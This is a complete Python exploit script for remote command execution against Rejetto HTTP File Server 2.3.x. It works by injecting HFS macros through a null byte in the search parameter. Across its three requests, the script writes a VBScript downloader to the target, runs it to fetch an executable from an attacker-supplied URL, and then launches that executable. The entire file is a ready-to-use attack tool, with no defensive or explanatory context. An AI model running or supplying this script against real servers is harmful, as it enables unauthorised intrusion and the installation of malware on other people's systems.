#!/usr/bin/env python3

import requests
from time import sleep
from sys import argv

def exploit(address, exeaddress, exeargs=''):
	
	save = 'save|C:\\Users\\Public\\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22' + exeaddress + '%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5C' + exeaddress.split('/')[-1] + '%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with'
	run = 'exec|cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs'
	exerun = 'exec|C%3A%5CUsers%5CPublic%5C' + exeaddress.split('/')[-1]
	if exeargs != '':
		exerun += '%20' + exeargs

	print('[+] Step 1 - Send the script')
	requests.get(address + '/?search=%00{.' + save + '.}')
	sleep(2)
	print('[+] Step 2 - Run the script')
	requests.get(address + '/?search=%00{.' + run + '.}')
	sleep(2)
	print('[+] Step 3 - Run the exe')
	requests.get(address + '/?search=%00{.' + exerun + '.}')
	print('[+] Done!')

def usage():
	print('Usage:')
	print(f'\t{argv[0]} <hfs url> <hosted exe url> [args to exe]\n')

def main():
	print('Rejetto HTTP File Server (HFS) 2.3.x - Remote Execution Tool')

	if len(argv) < 3:
		usage()
	else:
		print(f'[+] Exploiting HFS at {argv[1]} - executing {argv[2].split("/")[-1]}')
		exeargs = '%20'.join(argv[3:])
		exploit(argv[1], argv[2], exeargs)

main()
